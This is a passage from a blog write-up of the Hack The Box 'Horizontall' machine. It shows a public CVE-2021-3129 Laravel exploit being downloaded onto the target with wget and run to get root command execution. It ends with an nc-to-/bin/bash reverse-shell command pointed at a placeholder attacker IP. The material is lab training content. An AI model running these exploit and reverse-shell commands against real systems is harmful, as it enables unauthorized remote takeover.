</pre></table></code></div></div><p>Used another exploit from : <a href="https://github.com/nth347/CVE-2021-3129_exploit">https://github.com/nth347/CVE-2021-3129_exploit</a></p><p>Also I donwload phpgcc on local machine and port over to victim machine. <code class="language-plaintext highlighter-rouge">git clone https://github.com/ambionics/phpggc.git</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre>strapi@horizontall:/tmp<span class="nv">$ </span>wget <span class="nt">-r</span> <span class="nt">-np</span> <span class="nt">-R</span> <span class="s2">"index.html*"</span> http://[YOURIPADDRESS]:1235/phpggc/ 

strapi@horizontall:/tmp<span class="nv">$ </span>wget http://[YOURIPADDRESS]:1235/exploit.py
<span class="nt">--2022-01-07</span> 02:04:09--  http://[YOURIPADDRESS]:1235/exploit.py
Connecting to <span class="o">[</span>YOURIPADDRESS]:1235... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2935 <span class="o">(</span>2.9K<span class="o">)</span> <span class="o">[</span>text/plain]
Saving to: â€˜exploit.pyâ€™

exploit.py                                 100%[<span class="o">======================================================================================&gt;]</span>   2.87K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s      

2022-01-07 02:04:09 <span class="o">(</span>18.2 MB/s<span class="o">)</span> - â€˜exploit.pyâ€™ saved <span class="o">[</span>2935/2935]

strapi@horizontall:/tmp<span class="nv">$ </span><span class="nb">chmod</span> +x exploit.py 
strapi@horizontall:/tmp<span class="nv">$ </span>./exploit.py http://localhost:8000 Monolog/RCE1 <span class="nb">id</span>
<span class="o">[</span>i] Trying to clear logs
<span class="o">[</span>+] Logs cleared
<span class="o">[</span>+] PHPGGC found. Generating payload and deploy it to the target
<span class="o">[</span>+] Successfully converted logs to PHAR
<span class="o">[</span>+] PHAR deserialized. Exploited

<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>

<span class="o">[</span>i] Trying to clear logs
<span class="o">[</span>+] Logs cleared
</pre></table></code></div></div><p>To get a reverse shell:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>strapi@horizontall:/tmp<span class="nv">$ </span>./exploit.py http://localhost:8000 Monolog/RCE1 <span class="s2">"nc [YOURIPADDRESS] 6666 | /bin/bash 2&gt;&amp;1 | nc [YOURIPADDRESS] 6667"</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="https://github.com/am-a-circle/am-a-circle.github.io/blob/main/assets/img/htb/horizontall/horizontall7.png?raw=true" alt="enter image description here" /></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/htb/'>HTB</a>, <a href='/categories/easyyy/'>easyyy</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/cve/" class="post-tag no-text-decoration" >CVE</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=horizontall - am-a-circle&url=https://am-a-circle.github.io//posts/horizontall/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=horizontall - am-a-circle&u=https://am-a-circle.github.io//posts/horizontall/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=horizontall - am-a-circle&url=https://am-a-circle.github.io//posts/horizontall/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/CarPT-Part1/">Automobile Hacking - Part 1</a><li><a href="/posts/CarPT-Part2/">Automobile Hacking - Part 2</a><li><a href="/posts/CRTP/">Attacking and Defending Active Directory Lab Course</a><li><a href="/posts/goals/">Goals</a><li><a href="/posts/speed/">Speed</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/pentest/">Pentest</a> <a class="post-tag" href="/tags/suid/">SUID</a> <a class="post-tag" href="/tags/cve/">CVE</a> <a class="post-tag" href="/tags/path-variable/">Path Variable</a> <a class="post-tag" href="/tags/base64/">base64</a> <a class="post-tag" href="/tags/cp/">cp</a> <a class="post-tag" href="/tags/crtp/">CRTP</a> <a class="post-tag" href="/tags/disk-group/">Disk Group</a> <a class="post-tag" href="/tags/dns/">DNS</a> <a class="post-tag" href="/tags/docker-escape/">Docker Escape</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/speed/"><div class="card-body"> <span class="timeago small" >Mar 15, 2022<i class="unloaded">2022-03-15T10:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Speed</h3><div class="text-muted small"><p> Overview Fun box that requires you to search for available exploits. Box Difficulty Link Medium HackmyVM Recon 1 2 3 4 5 6 7 8 9 â”Œâ”€â”€(ro...</p></div></div></a></div><div class="card"> <a href="/posts/CarPT-Part2/"><div class="card-body"> <span class="timeago small" >May 10, 2023<i class="unloaded">2023-05-10T09:55:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Automobile Hacking - Part 2</h3><div class="text-muted small"><p> Setting Up can-utils to Connect to CAN Devices Welcome to the second post in our blog series on car penetration testing. In this post, we will explore how to set up and utilize the powerful can-ut...</p></div></div></a></div><div class="card"> <a href="/posts/CarResource/"><div class="card-body"> <span class="timeago small" >May 10, 2023<i class="unloaded">2023-05-10T09:50:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Automobile Hacking Resource</h3><div class="text-muted small"><p> All in one resources Awesome Canbus - This curated list helps a reverse engineering CAN bus devices with lightly specializing in automotive embedded controller software and communication underst...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/icarus/" class="btn btn-outline-primary" prompt="Older"><p>icarus</p></a> <a href="/posts/dominator/" class="btn btn-outline-primary" prompt="Newer"><p>Dominator</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> Â© 2024 <a href="https://github.com/am-a-circle">am-a-circle</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/pentest/">Pentest</a> <a class="post-tag" href="/tags/suid/">SUID</a> <a class="post-tag" href="/tags/cve/">CVE</a> <a class="post-tag" href="/tags/path-variable/">Path Variable</a> <a class="post-tag" href="/tags/base64/">base64</a> <a class="post-tag" href="/tags/cp/">cp</a> <a class="post-tag" href="/tags/crtp/">CRTP</a> <a class="post-tag" href="/tags/disk-group/">Disk Group</a> <a class="post-tag" href="/tags/dns/">DNS</a> <a class="post-tag" href="/tags/docker-escape/">Docker Escape</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
